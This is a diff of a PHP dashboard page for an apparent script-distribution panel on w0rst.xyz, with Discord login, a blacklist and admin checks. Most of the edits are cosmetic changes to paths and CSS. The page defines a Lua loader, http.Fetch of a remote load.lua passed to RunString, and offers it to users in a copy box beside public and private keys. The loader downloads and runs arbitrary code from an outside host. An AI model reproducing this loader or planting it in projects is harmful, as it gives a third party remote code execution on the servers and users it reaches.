@@ -18,7 +18,7 @@ if($Local::IsBlacklisted()) { $Local::Redirect("blacklisted"); }
 // if discords null & localinfo exists
 // just a dumb error ez fix ;0 ;0 ;0
 if($discord == "NULL" && !empty($LocalInfo)) {
-    header("Location: https://w0rst.xyz/panel/core/auth/discord.php?action=login");
+    header("Location: https://w0rst.xyz/panel/req/discord.php?action=login");
 }
 
 $script = "http.Fetch('https://w0rst.xyz/project/func/load.lua', RunString)";
@@ -53,14 +53,14 @@ if($Local::IsAdmin()) {
 </div><br><br><br>
 <div class="hidden1">
     <div class="c-card">
-        <h1 class="card-title">Script Information</h1>
+        <h1 class="card-header">Script Information</h1>
         <div class="form-row">
             <label class="label">Public</label>
             <input class="input" id="public" value="<?php echo("$public"); ?>">
             <label class="label">Private</label>
             <input class="input" id="private" value="<?php echo("$private"); ?>">
             <label class="label">Script</label>
-            <input class="input" id="script" value="<?php echo("$script"); ?>">
+            <input class="input" id="script" value="<?php echo("$script"); ?>" style='margin-bottom:10px;'>
             <div class="button-container" style="padding-bottom:0;">
                 <button onclick="copy(1)" class="button material-ripple hover" style="width:85%;">Copy Public</button>
                 <button onclick="copy(2)" class="button material-ripple hover" style="width:85%;">Copy Private</button>
@@ -74,7 +74,7 @@ if($Local::IsAdmin()) {
     function dropdown() { $(".dropdown").fadeToggle(250); }
     function script() {  $(".hidden1").fadeToggle(250); $('body').css("overflow-y", "hidden"); }
     function account() { location.href = "account"; }
-    function logout() { location.href = "auth/simple.php?request=logout"; }
+    function logout() { location.href = "req/simple.php?request=logout"; }
     function redirect(type) {
         if(type == 1) { location.href = "dashboard"; }
         if(type == 2) { location.href = "members"; }
